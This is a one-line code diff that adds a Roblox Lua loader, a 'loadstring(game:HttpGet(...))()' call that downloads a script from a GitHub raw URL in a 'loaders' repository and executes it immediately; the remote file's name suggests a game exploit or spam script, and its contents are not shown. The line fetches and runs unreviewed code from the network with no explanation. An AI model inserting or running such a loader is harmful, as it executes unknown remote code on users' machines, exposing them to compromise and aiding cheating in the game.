@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/backseat-rally-spam7-o2y4dqe3mbtmgm.lua"))()
